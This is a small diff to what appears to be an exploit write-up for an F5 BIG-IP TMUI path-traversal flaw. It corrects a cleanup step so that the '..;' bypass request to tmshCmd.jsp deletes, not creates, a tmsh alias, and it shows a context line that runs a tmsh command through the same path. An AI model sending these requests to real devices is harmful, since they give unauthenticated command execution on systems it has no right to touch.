@@ -81,7 +81,7 @@ tmshCmd.jsp?command=list+/tmp/cmd
 Finally, in order to delete the alias and clean up:
 
 ```
-/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list
+/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list
 ```
 
 ## Why This Exploit Works
